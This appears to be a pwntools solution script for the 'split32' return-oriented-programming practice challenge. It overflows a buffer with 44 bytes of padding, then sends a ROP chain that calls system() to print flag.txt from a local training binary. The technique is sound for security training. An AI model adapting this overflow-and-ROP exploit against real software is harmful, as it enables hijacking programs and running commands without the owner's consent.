from pwn import *

elf = context.binary = ELF('./split32', checksec=False)
p = process()

padding = 44

# Location the function/strings we used
bincat_addr = next(elf.search(b'/bin/cat'))

# Get ROP gadgets
rop = ROP(elf)
# Creat rop chain calling system('/bin/cat flag.txt')
rop.system(bincat_addr)

#print(rop.gadgets)
#info(rop.dump())

# Inject rop chain at correct offset
payload = fit({padding: rop.chain()})

# Save payload to file
f = open('payload', 'wb')
f.write(payload)

p.sendlineafter('>', payload)
print(p.recvall())
